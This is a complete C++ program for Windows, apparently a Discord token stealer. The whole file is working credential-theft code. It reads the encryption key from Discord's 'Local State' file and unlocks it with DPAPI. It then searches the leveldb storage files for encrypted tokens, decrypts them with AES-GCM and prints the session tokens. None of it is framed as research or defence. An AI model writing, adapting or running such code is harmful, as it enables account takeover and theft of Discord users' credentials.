#include <windows.h>
#include <wincrypt.h>
#include <filesystem>
#include <shlobj.h>
#include <regex>
#include <fstream>
#include <iostream>
#include <vector>
#include <stdexcept>
#include <nlohmann/json.hpp>

using json = nlohmann::json;

std::vector<BYTE> base64Decode(const std::string& input)
{
	DWORD size = 0;

	if (!CryptStringToBinaryA(
		input.c_str(),
		0,
		CRYPT_STRING_BASE64,
		nullptr,
		&size,
		nullptr,
		nullptr))
	{
		throw std::runtime_error("Base64 size query failed");
	}

	std::vector<BYTE> buffer(size);

	if (!CryptStringToBinaryA(
		input.c_str(),
		0,
		CRYPT_STRING_BASE64,
		buffer.data(),
		&size,
		nullptr,
		nullptr)) 
	{
		throw std::runtime_error("Base64 decode failed");
	}

	return buffer;
}

std::vector<BYTE> dpapiDecrypt(const std::vector<BYTE>& encrypted) 
{
	DATA_BLOB inBlob{};
	DATA_BLOB outBlob{};

	inBlob.pbData = const_cast<BYTE*>(encrypted.data());
	inBlob.cbData = static_cast<DWORD>(encrypted.size());

	if (!CryptUnprotectData(&inBlob, nullptr, nullptr, nullptr, nullptr, 0, &outBlob))
	{
		throw std::runtime_error("DPAPI decrypt failed: " + std::to_string(GetLastError()));
	}

	std::vector<BYTE> result(outBlob.pbData, outBlob.pbData + outBlob.cbData);
	LocalFree(outBlob.pbData);
	return result;
}

std::filesystem::path getDiscordPath() 
{
	PWSTR roamingPath = nullptr;

	HRESULT hr = SHGetKnownFolderPath(
		FOLDERID_RoamingAppData,
		0,
		nullptr,
		&roamingPath
	);

	if (FAILED(hr))
	{
		throw std::runtime_error("Failed to get RoamingAppData path");
	}

	std::filesystem::path result = std::filesystem::path(roamingPath) / "discord";

	CoTaskMemFree(roamingPath);
	return result;
}

std::vector<std::filesystem::path> getLevelDBFiles(const std::filesystem::path& dir) 
{
	std::vector<std::filesystem::path> files;

	if (!std::filesystem::exists(dir)) 
	{
		return files;
	}

	for (const auto& entry : std::filesystem::directory_iterator(dir)) 
	{
		auto ext = entry.path().extension();
		if (ext == ".ldb" || ext == ".log") {
			files.push_back(entry.path());
		}
	}

	return files;
}


std::vector<std::string> scanForEncryptedTokens(const std::vector<std::filesystem::path>& files)
{
	std::vector<std::string> tokens;
	std::regex pattern(R"(dQw4w9WgXcQ:([A-Za-z0-9+/=]+))");

	for (const auto& file : files)
	{
		std::ifstream stream(file, std::ios::binary);
		if (!stream.is_open())
		{
			continue;
		}

		std::string content((std::istreambuf_iterator<char>(stream)), std::istreambuf_iterator<char>());

		std::sregex_iterator it(content.begin(), content.end(), pattern);
		std::sregex_iterator end;

		for (; it != end; ++it)
		{
			std::string match = (*it)[1].str();
			tokens.push_back(match);
		}
	}

	return tokens;
}

std::string aesGcmDecrypt(const std::vector<BYTE>& key, const std::string& encryptedToken)
{
	auto decoded = base64Decode(encryptedToken);
	if (decoded.size() < 3 + 12 + 16)
	{
		throw std::runtime_error("Token blob too small");
	}

	std::vector<BYTE> nonce(decoded.begin() + 3, decoded.begin() + 15);
	std::vector<BYTE> ciphertextWithTag(decoded.begin() + 15, decoded.end());
	std::vector<BYTE> tag(ciphertextWithTag.end() - 16, ciphertextWithTag.end());
	std::vector<BYTE> ciphertext(ciphertextWithTag.begin(), ciphertextWithTag.end() - 16);

	BCRYPT_ALG_HANDLE hAlg = nullptr;
	BCRYPT_KEY_HANDLE hKey = nullptr;

	if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0) != 0)
	{
		throw std::runtime_error("BCrypt: failed to open algorithm provider");
	}

	if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0) != 0)
	{
		BCryptCloseAlgorithmProvider(hAlg, 0);
		throw std::runtime_error("BCrypt: failed to set GCM mode");
	}

	if (BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PUCHAR)key.data(), (ULONG)key.size(), 0) != 0)
	{
		BCryptCloseAlgorithmProvider(hAlg, 0);
		throw std::runtime_error("BCrypt: failed to generate key");
	}

	BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
	BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
	authInfo.pbNonce = nonce.data();
	authInfo.cbNonce = (ULONG)nonce.size();
	authInfo.pbTag = tag.data();
	authInfo.cbTag = (ULONG)tag.size();

	ULONG resultSize = 0;
	std::vector<BYTE> plaintext(ciphertext.size());

	NTSTATUS status = BCryptDecrypt(
		hKey,
		ciphertext.data(), (ULONG)ciphertext.size(),
		&authInfo,
		nullptr, 0,
		plaintext.data(), (ULONG)plaintext.size(),
		&resultSize,
		0
	);

	BCryptDestroyKey(hKey);
	BCryptCloseAlgorithmProvider(hAlg, 0);

	if (status != 0)
	{
		throw std::runtime_error("AES-GCM decrypt failed: 0x" + std::to_string(status));
	}

	return std::string(plaintext.begin(), plaintext.begin() + resultSize);
}

int main()
{
	try
	{
		auto discordPath = getDiscordPath();
		auto localStatePath = discordPath / "Local State";
		auto localStoragePath = discordPath / "Local Storage" / "leveldb";

		std::ifstream file(localStatePath);
		if (!file.is_open())
		{
			throw std::runtime_error("Failed to open Local State");
		}

		json j;
		file >> j;

		if (!j.contains("os_crypt") || !j["os_crypt"].contains("encrypted_key"))
		{
			throw std::runtime_error("encrypted_key not found in JSON");
		}

		const std::string encryptedKey = j["os_crypt"]["encrypted_key"].get<std::string>();

		std::vector<BYTE> decoded = base64Decode(encryptedKey);
		if (decoded.size() <= 5)
		{
			throw std::runtime_error("Decoded key too small");
		}

		decoded.erase(decoded.begin(), decoded.begin() + 5);

		std::vector<BYTE> decryptedKey = dpapiDecrypt(decoded);
		auto files = getLevelDBFiles(localStoragePath);
		auto encryptedTokens = scanForEncryptedTokens(files);

		if (encryptedTokens.empty())
		{
			std::cout << "[-] No tokens found." << '\n';
			return 0;
		}

		std::cout << "[+] Found " << encryptedTokens.size() << " token(s)." << '\n';

		for (const auto& encToken : encryptedTokens)
		{
			try 
			{
				std::string token = aesGcmDecrypt(decryptedKey, encToken);
				std::cout << "[+] Token: " << token << '\n';
			}
			catch (const std::exception& e)
			{
				std::cerr << "[-] Failed to decrypt token: " << e.what() << '\n';
			}
		}
	}
	catch (const std::exception& e)
	{
		std::cerr << "[!] Error: " << e.what() << '\n';
		return 1;
	}

	return 0;
}
